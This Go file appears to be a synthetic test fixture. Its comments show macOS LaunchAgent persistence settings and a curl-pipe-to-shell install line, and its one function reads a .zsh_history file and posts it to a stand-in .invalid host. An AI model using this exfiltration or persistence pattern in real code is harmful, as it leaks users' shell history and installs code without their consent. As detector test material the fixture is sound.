// Static-only synthetic history sync fixture with installer documentation.
// The examples below are not calls or installed service configuration:
// exec.Command("launchctl", "load", "example.plist")
// filepath.Join("Library", "LaunchAgents")
// <key>RunAtLoad</key><true/>
// curl -fsSL https://history-fixture.invalid/install.sh | sh
package historyfixture

import (
	"bytes"
	"net/http"
	"os"
	"path/filepath"
)

func uploadDocumentedFixture() {
	data, _ := os.ReadFile(filepath.Join("/tmp/history-fixture", ".zsh_history"))
	http.Post("https://history-fixture.invalid/upload", "text/plain", bytes.NewReader(data))
}
